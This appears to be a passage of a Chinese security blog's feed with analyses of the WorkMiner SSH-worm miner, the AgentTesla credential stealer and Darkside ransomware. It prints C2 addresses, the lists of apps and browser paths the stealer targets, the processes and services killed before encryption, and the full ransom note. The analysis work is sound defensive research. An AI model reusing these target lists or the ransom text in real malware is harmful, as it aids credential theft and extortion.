<h3 id="修改防火墙规则">修改防火墙规则</h3>
<p>执行命令，修改防火墙规则：</p>
<p><img src="/workminer_images/5133802220726.png" alt=""></p>
<p>修改命令如下：</p>
<pre tabindex="0"><code>iptables -I INPUT  -p tcp --dport
iptables -I OUTPUT -p tcp --sport
iptables -I POSTROUTING -t nat -p tcp --sport
iptables -I PREROUTING  -t nat -p tcp --dport
iptables -I INPUT  -p udp --dport %d -j ACCEPT
iptables -I OUTPUT -p udp --sport %d -j ACCEPT
iptables -I PREROUTING  -t nat -p udp --dport %d -j ACCEPT
iptables -I POSTROUTING -t nat -p udp --sport %d -j ACCEPT
</code></pre><h3 id="ssh蠕虫攻击">ssh蠕虫攻击</h3>
<p>在修改完防火墙规则后，执行<code>__home_haha_work_go_sshworm_work_Crackssh</code>函数，对<code>ssh</code>服务进行<code>Crack</code>：</p>
<p><img src="/workminer_images/2778508206278.png" alt=""></p>
<p>进入函数中首先检查当前目录（<code>/tmp</code>）下是否存在<code>./user.list</code>：</p>
<p><img src="/workminer_images/4941630160942.png" alt=""></p>
<p>如果存在且不为空，则加载内容至内存中；如果为空，则将<code>root</code>加载到内存中，当作<code>userlist</code>使用：</p>
<p><img src="/workminer_images/3213532179368.png" alt=""></p>
<p>然后检查当前目录（<code>/tmp</code>）下是否存在<code>./pass.list</code>：</p>
<p><img src="/workminer_images/2385533167235.png" alt=""></p>
<p>如果存在且不为空，则加载内容至内存中；如果为空，则将<code>123456</code>加载到内存中，当作<code>passlist</code>使用：</p>
<p><img src="/workminer_images/2635134187401.png" alt=""></p>
<p>接着新建一个<code>goroutine</code>池，用于多线程爆破：
<img src="/workminer_images/715138180070.png" alt=""></p>
<p>然后收集用于爆破的IP地址（包括内网、公网、已知主机的IP）：</p>
<p><img src="/workminer_images/137540176625.png" alt=""></p>
<p>如果收集到IP地址，则检查本地（<code>/.ssh/id_rsa</code>）是否存在公钥，如果存在公钥则在<code>goroutine</code>池中进行公钥登录尝试：</p>
<p><img src="/workminer_images/188745190259.png" alt=""></p>
<p>如果不存在公钥，则在<code>goroutine</code>池中进行默认登录尝试：</p>
<p><img src="/workminer_images/5561547187863.png" alt=""></p>
<p>如果未收集用于爆破的IP地址，则会获取<code>lanip</code>，并删除重复值：</p>
<p><img src="/workminer_images/2551955185365.png" alt=""></p>
<p>如果获取失败，则随机生成IP并判断是否是lanip，最后都将统一在<code>goroutine</code>池中进行默认登录尝试：</p>
<p><img src="/workminer_images/1287058166606.png" alt=""></p>
<p>在使用公钥登录（<code>__home_haha_work_go_sshworm_work_Pkeylogin</code>）或默认登录（<code>__home_haha_work_go_sshworm_work_LoginSsh</code>）成功后，都将调用<code>__home_haha_work_go_sshworm_work_scp_proc</code>函数，该函数会首先创建<code>/usr/.work</code>：</p>
<p><img src="/workminer_images/3321348090943.png" alt=""></p>
<p>接着创建<code>/tmp/.work</code>：</p>
<p><img src="/workminer_images/4934150109369.png" alt=""></p>
<p>添加权限并执行<code>work32</code>：</p>
<p><img src="/workminer_images/4232507107236.png" alt=""></p>
<p>等待2s后继续，添加权限并执行<code>work64</code>：</p>
<p><img src="/workminer_images/5347708127402.png" alt=""></p>
<p>整个蠕虫攻击形成闭环。</p>
<h3 id="main__cfunc_getconf">main__Cfunc_GetConf</h3>
<p>在执行完<code>ssh蠕虫攻击</code>后，最后调用<code>main__Cfunc_GetConf</code></p>
<p><img src="/workminer_images/3660828202700.png" alt=""></p>
<p>层层深入后发现恶意外链：</p>
<p><img src="/workminer_images/1768926215602.png" alt=""></p>
<p>查看<code>off_D8D080</code>地址处的字符串：</p>
<p><img src="/workminer_images/2444401130071.png" alt=""></p>
<p>上方存在循环，也就是说<code>[rbp+var_B0]</code>依次递增，通过循环可依次去除链接进行访问，查看循环出发点：</p>
<p><img src="/workminer_images/868405126626.png" alt=""></p>
<p>上一个函数应该就是外联函数（<code>sub_7341E0</code>）：</p>
<p><img src="/workminer_images/1618016140260.png" alt=""></p>
<p>进入其中，向下寻找，逐步定位函数<code>sub_73BAD0</code>为<code>socket</code>请求主函数：</p>
<p><img src="/workminer_images/2578817137864.png" alt=""></p>
<p>进入其中可以看到明显的<code>socket</code>、<code>bind</code>函数：</p>
<p><img src="/workminer_images/3633214122380.png" alt=""></p>
<p>外联过程分析结束，链接分析如下：</p>
<pre tabindex="0"><code>P2P节点如下：
router.bittorrent.com:6881
bttracker.debian.org:6881
router.utorrent.com:6881
dht.transmissionbt.com:6881

恶意CC如下：
212.129.33.59:6881
82.221.103.244:6881
130.239.18.159:6881
87.98.162.88:6881
</code></pre><h2 id="总结">总结</h2>
<p>主机感染木马后执行流程大致如下：</p>
<ol>
<li>杀掉本地已有的挖矿进程；</li>
<li>切换至<code>/tmp</code>路径，杀死<code>xmr</code>进程；</li>
<li>将系统命令<code>wget</code>改为<code>wget1</code>、<code>curl</code>改为<code>curl1</code>；</li>
<li>生成挖矿程序的配置文件<code>config.json</code>；</li>
<li>将挖矿程序写入到<code>xmr</code>中并执行；</li>
<li>生成<code>secure.sh</code>、<code>auth.sh</code>脚本并执行；</li>
<li>将<code>/tmp</code>下的文件拷贝到<code>/usr/.work</code>中去；</li>
<li>向<code>/root/.ssh/authorized_keys</code>中写入公钥，方便攻击者连接；</li>
<li>检测计划任务文件并添加计划任务；</li>
<li>修改防火墙规则，方便出站；</li>
<li>使用ssh蠕虫攻击其它主机；</li>
<li>访问外部链接；</li>
</ol>
<h2 id="建议">建议</h2>
<p>建议将上述的恶意CC及矿池地址（<code>xmr.crypto-pool.fr</code>,IP:<code>163.172.226.137</code>）添加至防火墙出站规则；</p>
<p>建议修改SSH服务端口，设置SSH服务基线，禁用Root用户登录、杜绝弱口令及设置错误限制次数；</p>
]]></content>
		</item>
		
		<item>
			<title>AgentTesla</title>
			<link>https://www.a1ee.cn/medium/agenttesla/</link>
			<pubDate>Thu, 24 Jun 2021 15:22:11 +0800</pubDate>
			
			<guid>https://www.a1ee.cn/medium/agenttesla/</guid>
			<description>AgentTesla窃密木马样本分析 1. 简介 Agent Tesla 是一种密码窃取间谍软件，自 2014 年以来一直存在。攻击者可以使用该恶意软件来监视受害者，使他们能够查</description>
			<content type="html"><![CDATA[<h1 id="agenttesla窃密木马样本分析">AgentTesla窃密木马样本分析</h1>
<h2 id="1-简介">1. 简介</h2>
<p>Agent Tesla 是一种密码窃取间谍软件，自 2014 年以来一直存在。攻击者可以使用该恶意软件来监视受害者，使他们能够查看在支持的程序和网络浏览器中输入的所有内容。</p>
<p>Agent Tesla 病毒在其自己的网站上进行营销和销售，该网站错误地声称该程序是为个人使用而创建的合法键盘记录器，因此在黑客社区中非常流行。不仅仅是因为它的易用性和技术支持，可以在攻击者出售此恶意软件的“官方”网站以及专用的 Discord 服务器上找到。尽管声称该软件是合法的，但售卖人员还是会就非法使用该病毒提出建议。</p>
<h2 id="2-样本详情">2. 样本详情</h2>
<p>本次分析的样本哈希如下：</p>
<pre tabindex="0"><code>MD5：af98b88c0b5dc353fbe536bd6fb8c4ec
SHA256：cc262fd3fa1f646aff2f5bcdea33beca5ed081260028b8604d5f714dd23c03ac
</code></pre><p>可以从<a href="https://app.any.run/tasks/84fc78ab-2695-4a5a-9a89-45f2497c38de/">any.run沙箱</a>查看到样本的行为及下载样本。</p>
<p>将样本用PEStudio打开，可以看到<code>Mircrosoft</code>将其标记为<code>AgentTesla</code>：</p>
<p><img src="/tesla_images/1832029179083.png" alt=""></p>
<p><code>libraries</code>标签可以看出这是一个.NET程序，且<code>strings</code>标签内字符串数量有点多，<code>version</code>标签中可以获取到样本的原始文件名及哈希情况：</p>
<p><img src="/tesla_images/3350431166950.png" alt=""></p>
<h2 id="3-样本分析">3. 样本分析</h2>
<p>使用<code>dnSpy</code>加载样本，向下观察代码，可以在<code>Helper</code>类中找到<code>Gzip</code>其中存放了约<code>10000</code>行数据，向下阅读代码，是<code>C#</code>中常用的解压缩函数<code>GZipStream</code>：</p>
<ol>
<li><img src="/tesla_images/5397454179785.png" alt=""></li>
</ol>
<h3 id="31-样本释放">3.1. 样本释放</h3>
<p>在<code>retrun result</code>处下断，得到了解压内存存放的内存地址<code>0x00027800</code>，在内存窗口中查看，可以明显看出是<code>PE</code>文件结构：</p>
<p><img src="/tesla_images/1477230100659.png" alt=""></p>
<p>使用<code>dnSpy</code>自带的保存功能，将该地址处存放的数据保存到本地，再使用<code>PEStudio</code>查看，这是一个名为：<code>Ihinax.dll</code>的<code>.NET</code>文件。</p>
<p><img src="/tesla_images/2901937119085.png" alt=""></p>
<p><code>Ihinax.dll</code>函数名经过了混淆，经过了长时间的阅读，在<code>LVU3WCMrRsWDmqar8f</code>空间下的<code>Su370LNVnsglWDN9lR</code>类的第311行，找到了<code>gzipStream</code>，下断点执行到此处，<code>array2</code>中所存放的内容是<code>PE</code>文件格式的内容。</p>
<p><img src="/tesla_images/2984344106952.png" alt=""></p>
<p>保存下来，使用<code>PEStudio</code>查看：</p>
<p><img src="/tesla_images/2175446127118.png" alt=""></p>
<p>这里推荐使用互联网工具对文件进行解压。<a href="https://www.unpac.me/results/01c9a92b-100b-4d9d-93cb-56a9029a0026#/">UnpacMe解压</a>结果如下：</p>
<p><img src="/tesla_images/1678414182094.png" alt=""></p>
<p>将手动解压与<code>UnpacMe</code>解压的内容进行<code>SHA256</code>比较，并无差别：</p>
<p><img src="/tesla_images/4437048119787.png" alt=""></p>
<h3 id="32-样本解码">3.2. 样本解码</h3>
<p>使用<code>dnSpy</code>加载最终的恶意程序，进入主函数可以看到一些奇怪的函数，<code>GetEnvironmentVariable</code>函数是用于获取系统变量的，参数却是函数<code>97085277-F30F-47FA-9C3D-82DA9E6730B4.L()</code>。</p>
<p><img src="/tesla_images/4581331127121.png" alt=""></p>
<p>进入其中可以看到类中有个类似于解密的东西，然后下方的方法进行方法传递：</p>
<p><img src="/tesla_images/3794127100662.png" alt=""></p>
<p>解密字符集：</p>
<p><img src="/tesla_images/3522028119088.png" alt=""></p>
<p><img src="/tesla_images/3441329106955.png" alt=""></p>
<p>这里可以使用<code>de4dot</code>对其进行动态解密，作者在<code>readme</code>中进行了如下说明：</p>
<p><img src="/tesla_images/1697150189976.png" alt=""></p>
<p><code>de4dot</code>对<code>--strtyp</code>参数的说明如下：</p>
<pre tabindex="0"><code>String decrypter types
  none             Don&#39;t decrypt strings
  default          Use default string decrypter type (usually static)
  static           Use static string decrypter if available
  delegate         Use a delegate to call the real string decrypter
  emulate          Call real string decrypter and emulate certain instructions
</code></pre><p>这里选取了<code>emulate</code>进行尝试，但是作者显然并不想我们这么容易就解除了混淆，加密字符串居然有<code>6000535h - 600022Bh = 30Ah</code>处！</p>
<p><img src="/tesla_images/440434116345.png" alt=""></p>
<p>所以我简单生成了一个粗糙的bat：</p>
<pre tabindex="0"><code>de4dot.exe dump2.bin --strtyp emulate --strtok 600022B
rename dump2-cleaned.bin dump3.bin
de4dot.exe dump3.bin --strtyp emulate --strtok 600022C
del dump3.bin
rename dump3-cleaned.bin dump3.bin
de4dot.exe dump3.bin --strtyp emulate --strtok 600022D
del dump3.bin
rename dump3-cleaned.bin dump3.bin
de4dot.exe dump3.bin --strtyp emulate --strtok 600022E
del dump3.bin
rename dump3-cleaned.bin dump3.bin
de4dot.exe dump3.bin --strtyp emulate --strtok 600022F
del dump3.bin
rename dump3-cleaned.bin dump3.bin
……
……
……
de4dot.exe dump3.bin --strtyp emulate --strtok 6000533
del dump3.bin
rename dump3-cleaned.bin dump3.bin
de4dot.exe dump3.bin --strtyp emulate --strtok 6000534
del dump3.bin
rename dump3-cleaned.bin dump3.bin
de4dot.exe dump3.bin --strtyp emulate --strtok 6000535
del dump3.bin
rename dump3-cleaned.bin dump3.bin
</code></pre><p>在经过了大约二十分钟后，我获得了一个解密后的程序：</p>
<p><img src="/tesla_images/115833119790.png" alt=""></p>
<h3 id="33-代码阅读">3.3. 代码阅读</h3>
<p>对于<code>C#</code>程序，既然字符串已经还原了，个人习惯是先阅读代码，然后就会有如下的这些发现。</p>
<h4 id="331-设置开机自启">3.3.1. 设置开机自启</h4>
<p><img src="/tesla_images/3034945140663.png" alt=""></p>
<h4 id="332-获取本机公网ip">3.3.2. 获取本机公网ip</h4>
<p><img src="/tesla_images/18847159089.png" alt=""></p>
<h4 id="333-下载文件">3.3.3. 下载文件</h4>
<p><img src="/tesla_images/1613451167122.png" alt=""></p>
<h4 id="334-获取系统信息">3.3.4. 获取系统信息</h4>
<p><img src="/tesla_images/2452553159791.png" alt=""></p>
<h4 id="335-截取屏幕">3.3.5. 截取屏幕</h4>
<p><img src="/tesla_images/5994156156346.png" alt=""></p>
<h4 id="336-ftp服务操作">3.3.6. FTP服务操作</h4>
<p><img src="/tesla_images/764505162100.png" alt=""></p>
<h4 id="337-浏览器用户数据窃取">3.3.7. 浏览器用户数据窃取</h4>
<p><img src="/tesla_images/3854308179980.png" alt=""></p>
<h4 id="338-smtp请求配置">3.3.8. SMTP请求配置</h4>
<p><img src="/tesla_images/2423011177584.png" alt=""></p>
<h4 id="339-键盘记录">3.3.9. 键盘记录</h4>
<p><img src="/tesla_images/4989936183004.png" alt=""></p>
<h4 id="3310-socket通信">3.3.10. SOCKET通信</h4>
<p><img src="/tesla_images/630324175086.png" alt=""></p>
<h4 id="3311-数据上传">3.3.11. 数据上传</h4>
<p><img src="/tesla_images/5323027156327.png" alt=""></p>
<h4 id="3312-des加密">3.3.12. DES加密</h4>
<p><img src="/tesla_images/4082929178767.png" alt=""></p>
<h4 id="3313-判断操作系统版本">3.3.13. 判断操作系统版本</h4>
<p><img src="/tesla_images/1222354160583.png" alt=""></p>
<h4 id="3314-特殊软件的凭证窃取">3.3.14. 特殊软件的凭证窃取</h4>
<p>特殊软件的凭证窃取（下图是Edge浏览器的窃取函数段）</p>
<p><img src="/tesla_images/3238651188043.png" alt=""></p>
<p>从Edge凭证窃取函数可以看出，窃取函数存在以下特征：</p>
<pre tabindex="0"><code>UserName =
Password =
Browser = &#34;&#34;
</code></pre><p>检索全部代码，反复确认后，发现窃取目标包含以下对象：</p>
<pre tabindex="0"><code>Browser = &#34;IE/Edge&#34;
Browser = &#34;Edge Chromium&#34;
Browser = &#34;QQ Browser&#34;
Browser = &#34;incredimail&#34;
x.Browser = &#34;Eudora&#34;
Browser = &#34;Falkon Browser&#34;
Browser = &#34;Falkon Browser&#34;
Browser = &#34;ClawsMail&#34;
Browser = &#34;Flock Browser&#34;
Browser = &#34;DynDNS&#34;
x.Browser = &#34;Psi/Psi+&#34;
x.Browser = &#34;Open VPN&#34;
x.Browser = &#34;FileZilla&#34;
Browser = &#34;WinSCP&#34;
Browser = &#34;FlashFXP&#34;
x.Browser = &#34;FTP Navigator&#34;
x.Browser = &#34;JDownloader&#34;
Browser = &#34;Paltalk&#34;
Browser = &#34;Pidgin&#34;
Browser = &#34;SmartFTP&#34;
x.Browser = &#34;WS_FTP&#34;
Browser = &#34;FTPCommander&#34;
x.Browser = &#34;FTPGetter&#34;
Browser = &#34;NO-IP&#34;
Browser = &#34;NO-IP&#34;
Browser = &#34;TheBat&#34;
x.Browser = &#34;Becky!&#34;
Browser = &#34;Trillian&#34;
x.Browser = &#34;Outlook&#34;
x.Browser = &#34;Foxmail&#34;
x.Browser = &#34;Opera Mail&#34;
x.Browser = &#34;PocoMail&#34;
Browser = &#34;eM Client&#34;
x.Browser = &#34;Mailbird&#34;
x.Browser = &#34;Mailbird&#34;
Browser = &#34;NordVPN&#34;
Browser = &#34;MySQL Workbench&#34;
Browser = &#34;Private Internet Access&#34;
x.Browser = &#34;Safari Browser&#34;
x.Browser = &#34;Internet Download Manager&#34;
</code></pre><h4 id="3315-vnc凭证窃取">3.3.15. VNC凭证窃取</h4>
<p><img src="/tesla_images/1320920203013.png" alt=""></p>
<h4 id="3316-下载tor浏览器">3.3.16. 下载Tor浏览器</h4>
<p><img src="/tesla_images/4431331170914.png" alt=""></p>
<h3 id="34-动态调试">3.4. 动态调试</h3>
<p>进入程序入口，会生成一串字符串，用于标识受害者主机，然后会设置一个30s的定时循环任务，接着开始进行浏览器用户数据窃取；</p>
<p><img src="/tesla_images/2016144140664.png" alt=""></p>
<p>汇总如下：</p>
<pre tabindex="0"><code>@&#34;C:\Users\alee\AppData\Local\7Star\7Star\User Data&#34;
@&#34;C:\Users\alee\AppData\Local\uCozMedia\Uran\User Data&#34;
@&#34;C:\Users\alee\AppData\Local\MapleStudio\ChromePlus\User Data&#34;
@&#34;C:\Users\alee\AppData\Local\Yandex\YandexBrowser\User Data&#34;
@&#34;C:\Users\alee\AppData\Local\Torch\User Data&#34;
@&#34;C:\Users\alee\AppData\Local\Coowon\Coowon\User Data&#34;
@&#34;C:\Users\alee\AppData\Local\Comodo\Dragon\User Data&#34;
@&#34;C:\Users\alee\AppData\Local\Sputnik\Sputnik\User Data&#34;
@&#34;C:\Users\alee\AppData\Local\Iridium\User Data&#34;
@&#34;C:\Users\alee\AppData\Local\Vivaldi\User Data&#34;
@&#34;C:\Users\alee\AppData\Roaming\Opera Software\Opera Stable&#34;
@&#34;C:\Users\alee\AppData\Local\Chedot\User Data&#34;
@&#34;C:\Users\alee\AppData\Local\CocCoc\Browser\User Data&#34;
@&#34;C:\Users\alee\AppData\Local\Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer&#34;
@&#34;C:\Users\alee\AppData\Local\Epic Privacy Browser\User Data&#34;
@&#34;C:\Users\alee\AppData\Local\Elements Browser\User Data&#34;
@&#34;C:\Users\alee\AppData\Local\Amigo\User Data&#34;
@&#34;C:\Users\alee\AppData\Local\CatalinaGroup\Citrio\User Data&#34;
@&#34;C:\Users\alee\AppData\Local\BraveSoftware\Brave-Browser\User Data&#34;
@&#34;C:\Users\alee\AppData\Local\360Chrome\Chrome\User Data&#34;
@&#34;C:\Users\alee\AppData\Local\Kometa\User Data&#34;
@&#34;C:\Users\alee\AppData\Local\liebao\User Data&#34;
@&#34;C:\Users\alee\AppData\Local\CentBrowser\User Data&#34;
@&#34;C:\Users\alee\AppData\Local\QIP Surf\User Data&#34;
@&#34;C:\Users\alee\AppData\Local\Chromium\User Data&#34;
@&#34;C:\Users\alee\AppData\Local\Orbitum\User Data&#34;
</code></pre><p>然后会在每一个目录下寻找<code>logins</code>文件夹，窃取其中的信息</p>
<p><img src="/tesla_images/4256159090.png" alt=""></p>
<p>针对<code>logins</code>内的文件窃取函数内容如下：</p>
<p><img src="/tesla_images/4252004160664.png" alt=""></p>
<p>往下则是一列窃取函数的调用，核实并整理后如下：</p>
<pre tabindex="0"><code>list.AddRange(global::A.b.E.LoginsSteal(x.A, x.A));
list.AddRange(global::A.b.E.RimArtsSteal());
list.AddRange(global::A.b.E.ChromeSteal());
list.AddRange(global::A.b.E.FlockSteal());
list.AddRange(global::A.b.E.IceDragonSteal());
list.AddRange(global::A.b.E.OpearMailSteal());
list.AddRange(global::A.b.E.GetOSVersion());
list.AddRange(global::A.b.E.ClawsMailSteal());
list.AddRange(global::A.b.E.PostboxSteal());
list.AddRange(global::A.b.E.AppleSteal());
list.AddRange(global::A.b.E.IncrediMailSteal());
list.AddRange(global::A.b.E.BlackHawkSteal());
list.AddRange(global::A.b.E.IceCatSteal());
list.AddRange(global::A.b.E.WaterFoxSteal());
list.AddRange(global::A.b.E.PocomailSteal());
list.AddRange(global::A.b.E.UCBrowserSteal());
list.AddRange(global::A.b.E.FileZillaSteal());
list.AddRange(global::A.b.E.FirefoxSteal());
list.AddRange(global::A.b.E.WinSCP_2_Steal());
list.AddRange(global::A.b.E.FalkonSteal());
list.AddRange(global::A.b.E.QQBrowserSteal());
list.AddRange(global::A.b.E.CyberFoxSteal());
list.AddRange(global::A.b.E.SeaMonkeySteal());
list.AddRange(global::A.b.E.K-MeleonSteal());
list.AddRange(global::A.b.E.OutLookSteal());
list.AddRange(global::A.b.E.FoxmailSteal());
list.AddRange((IEnumerable&lt;global::A.b.X&gt;)global::A.b.E.EudoraSteal());
list.AddRange(global::A.b.E.ThunderbirdSteal());
list.AddRange(global::A.b.E.PaleMoonSteal());
</code></pre><h2 id="4-总结">4. 总结</h2>
<p>AgentTesla是一款商业窃密木马，当中还存在某些交互并未深入分析，不过基础模块已经很清晰了，从这些模块可以看出大多是针对浏览器和邮件客户端的窃密。这里提醒大家尽量不要在浏览器中保存密码，在使用邮件客户端时，也应当格外小心。</p>
]]></content>
		</item>
		
		<item>
			<title>DarksideRansomware</title>
			<link>https://www.a1ee.cn/medium/darksideransomware/</link>
			<pubDate>Tue, 25 May 2021 10:56:10 +0800</pubDate>
			
			<guid>https://www.a1ee.cn/medium/darksideransomware/</guid>
			<description>DarksideRansomware样本分析 样本信息 本次分析的样本来源于MALWAREbazaar。具体的SHA、MD5如下： SHA256 hash:151fbd6c299e734f7853497bd083abfa29f8c186a9db31dbe330ace2d35660d5 SHA1 hash:eeb28144f39b275ee1ec008859e80f215710dc57 MD5 hash:9d418ecc0f3bf45029263b0944236884 本</description>
			<content type="html"><![CDATA[<h1 id="darksideransomware样本分析">DarksideRansomware样本分析</h1>
<h2 id="样本信息">样本信息</h2>
<p>本次分析的样本来源于<a href="https://bazaar.abuse.ch/sample/151fbd6c299e734f7853497bd083abfa29f8c186a9db31dbe330ace2d35660d5/">MALWAREbazaar</a>。具体的SHA、MD5如下：</p>
<pre tabindex="0"><code>SHA256 hash:151fbd6c299e734f7853497bd083abfa29f8c186a9db31dbe330ace2d35660d5
SHA1 hash:eeb28144f39b275ee1ec008859e80f215710dc57
MD5 hash:9d418ecc0f3bf45029263b0944236884
</code></pre><p>本次分析的环境是：<code>windows 7 ultimate sp1 x64</code></p>
<h2 id="样本分析">样本分析</h2>
<h3 id="去除重定位">去除重定位</h3>
<p>因为是在win7上做调试，使用LordPE关闭程序的重定位（为了方便写注释），由于该样本逻辑并不复杂，所以也可以不做这一步。</p>
<p><img src="/darkside_images/3185806156853.png" alt=""></p>
<p>（注：为方便区分，关闭重定向后的样本名为：Darkside.exe）</p>
<h3 id="普通用户权限运行样本">普通用户权限运行样本</h3>
<p>从函数功能及运行流程可以得出：当样本感染了一台主机后，会动态加载自身所需的dll，接着释放使用的字符串，然后判断当前执行权限是否是admin权限，如果不是，则进行提权，然后用管理员权限重载自身。</p>
<p><img src="/darkside_images/3132437176854.png" alt=""></p>
<h4 id="加载dll函数">加载dll函数</h4>
<p>dll的加载又解密函数解密dll名称，再使用<code>loardlibrary</code>加载。解密函数核心流程如下：</p>
<p><img src="/darkside_images/3880452197020.png" alt=""></p>
<p>最后解出来的dll名称为：</p>
<pre tabindex="0"><code>ntdll,kernel32,advapi32,shell32,ole32,oleaut32,mpr,iphlpapi,shlwapi,gdi32,user32,netapi32,wsock32,wininet,wtsapi32
</code></pre><h4 id="字符串解析">字符串解析</h4>
<p>以下就是字符串解析的核心算法：</p>
<p><img src="/darkside_images/5527236106855.png" alt=""></p>
<p>当解密函数运行结束，可以看到以下调用关系：</p>
<p><img src="/darkside_images/1727847127021.png" alt=""></p>
<p>手动导出字符串，内容如下：</p>
<pre tabindex="0"><code>$recycle.bin，config.msi，$windows.~bt，$windows.~ws，windows，appdata，application data，boot，google，mozilla，program files，program files (x86)，programdata，system volume information，tor browser，windows.old，intel，msocache，perflogs，x64dbg，public，all users，default

autorun.inf，boot.ini，bootfont.bin，bootsect.bak，desktop.ini，iconcache.db，ntldr，ntuser.dat，ntuser.dat.log，ntuser.ini，thumbs.db

386，adv，ani，bat，bin，cab，cmd，com，cpl，cur，deskthemepack，diagcab，diagcfg，diagpkg，dll，drv，exe，hlp，icl，icns，ico，ics，idx，ldf，lnk，mod，mpa，msc，msp，msstyles，msu，nls，nomedia，ocx，prf，ps1，rom，rtp，scr，shs，spl，sys，theme，themepack，wpx，lock，key，hta，msi，pdb

backup

sql，sqlite

vmcompute.exe，vmms.exe，vmwp.exe，svchost.exe，TeamViewer.exe，explorer.exe

sql，oracle，ocssd，dbsnmp，synctime，agntsvc，isqlplussvc，xfssvccon，mydesktopservice，ocautoupds，encsvc，firefox，tbirdconfig，mydesktopqos，ocomm，dbeng50，sqbcoreservice，excel，infopath，msaccess，mspub，onenote，outlook，powerpnt，steam，thebat，thunderbird，visio，winword，wordpad，notepad

vss，sql，svc$，memtas，mepocs，sophos，veeam，backup，GxVss，GxBlr，GxFWD，GxCVD，GxCIMgr

securebestapp20.com，temisleyes.com

All of your files are encrypted! Find %s and Follow Instructions!

----------- [ Welcome to DarkSide ] -------------&gt;

What happend?
----------------------------------------------
Your computers and servers are encrypted, backups are deleted. We use strong encryption algorithms, so you cannot decrypt your data. .. But you can restore everything by purchasing a special program from us - universal decryptor. This program will restore all your network
Follow our instructions below and you will recover all your data.

What guarantees?
----------------------------------------------
We value our reputation. If we do not do our work and liabilities, nobody will pay us. This is not in our interests.
All our decryption software is perfectly tested and will decrypt your data. We will also provide support in case of problems.
We guarantee to decrypt one file for free. Go to the site and contact us.

How to get access on website?
----------------------------------------------
Using a TOR browser:
1) Download and install TOR browser from this site: https://torproject.org/
2) Open our website: http://darksidfqzcuhtk2.onion/CZEX8E0GR0AO4ASUCJE1K824OKJA1G24B8B3G0P84LJTTE7W8EC86JBE7NBXLMRT

When you open our website, put the following data in the input form:
Key
:0kZdK3HQhsAkUtvRl41QkOdpJvzcWnCrBjjgg5U4zfuWeTnZR5Ssjd3QLHpmbjxjo7uWzKbt8qPVuYN38TsDPI3bemd5I40ksemIzuI5OhIHZsi9cn3Wpd7OUT72FP9MyAUzR586yMsI2Ygri9in0Bf4EkG0pmBOLyRG1T788foGJQW1WxS1Qd2sMVvX0jKlbGG1zLp7g0u6buDCzSMyTjWjuVzJYufBBv7S2XvciEVvboiTNbZA4UUU6PttKERQSb018aILd6xO3ulk6fbEgZDO5tZSGn2zRevn5YXnHtg6vt1ToLe3izQOgYbs8Ja1fkfJBUYVux1ITyWBjpn0xPayKfwln8SqgMkbqiDyxEDEtFhqiffLcONMhi4TmW50loZIC6mWSaOjThWp6XSJUWPtY8Mkzs8Cs0qjPahx58iAEVIRGUVpLkMs7xPN7ydZ6wMWaOcRC1AD1JEUVTjLikXXyckgYaS6FnEv0UNEsv6QbTLSpDomIg3rEYZBib6ozrwH5n0M5wrKo8NciUBmfJWDP4XKkjznpsa05rEpuAklM0dMmZsYGVR

!!! DANGER !!!
DO NOT MODIFY or try to RECOVER any files yourself. We WILL NOT be able to RESTORE them.
!!! DANGER !!!
</code></pre><h4 id="访问令牌读取函数">访问令牌读取函数</h4>
<p>进入函数内部，根据api调用情况可以看到该函数结构简单：</p>
<p><img src="/darkside_images/2427851119690.png" alt=""></p>
<p>这里有两个判断较为重要</p>
<pre tabindex="0"><code>cmp dword ptr ds:[eax+0x8], 0x20
cmp dword ptr ds:[eax+0xC], 0x220
</code></pre><p>在微软官方的<a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/well-known-sids">安全标识符说明</a>中可以找到sid的值为32和544的角色权限分别如下：</p>
<p><img src="/darkside_images/5706513170561.png" alt=""></p>
<p><img src="/darkside_images/5203714188987.png" alt=""></p>
<p>如果没有这两个权限，那么将不会进行uac提权。</p>
<h4 id="提权和重载自身函数">提权和重载自身函数</h4>
<p>该部分均为api调用，较为简单明了。</p>
<p><img src="/darkside_images/2970710126245.png" alt=""></p>
<h3 id="管理员权限运行样本">管理员权限运行样本</h3>
<p>当样本获得了管理员权限，那么自然是要进行加密操作了，在此之前，它将会通过crc32计算后缀名用于图标生成和加密文件字符串添加；检索本地语言；发送信息至服务器；删除本地卷影；检索本地磁盘空闲空间；加密所有文件；自我删除。</p>
<h4 id="后缀名生成函数">后缀名生成函数</h4>
<p>该函数主要是<code>crc32计算</code>。图标的名字来源于uuid，通过了4次crc32计算</p>
<p><img src="/darkside_images/5111541121999.png" alt=""></p>
<p>crc32计算函数如下：</p>
<p><img src="/darkside_images/4693844139879.png" alt=""></p>
<h4 id="本地语言判断函数">本地语言判断函数</h4>
<p>样本会获取本地<code>默认ui语言</code>和<code>区域格式语言</code>，如果是<code>白名单</code>内的语言，则退出，不是则进行下一步。语言判断函数部分核心如下：</p>
<p><img src="/darkside_images/1011651136226.png" alt=""></p>
<p>从<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lcid/70feba9f-294e-491e-b6eb-56532684c37f">Windows语言代码标识符（LCID）参考</a>中得知，本地语言所有判断如下：</p>
<table>
<thead>
<tr>
<th style="text-align:center">序号</th>
<th style="text-align:center">语言代码（hex）</th>
<th style="text-align:center">标识符</th>
<th style="text-align:center">语种</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">419</td>
<td style="text-align:center">ru-RU</td>
<td style="text-align:center">俄语</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">422</td>
<td style="text-align:center">uk-UA</td>
<td style="text-align:center">乌克兰语</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">423</td>
<td style="text-align:center">be-BY</td>
<td style="text-align:center">白俄罗斯语</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td style="text-align:center">428</td>
<td style="text-align:center">tg-Cyrl-TJ</td>
<td style="text-align:center">塔吉克语（西里尔文）</td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td style="text-align:center">42B</td>
<td style="text-align:center">hy-AM</td>
<td style="text-align:center">亚美尼亚语</td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td style="text-align:center">42C</td>
<td style="text-align:center">az-Latn-AZ</td>
<td style="text-align:center">阿塞拜疆语（拉丁语）</td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td style="text-align:center">437</td>
<td style="text-align:center">ka-GE</td>
<td style="text-align:center">格鲁吉亚语</td>
</tr>
<tr>
<td style="text-align:center">8</td>
<td style="text-align:center">43F</td>
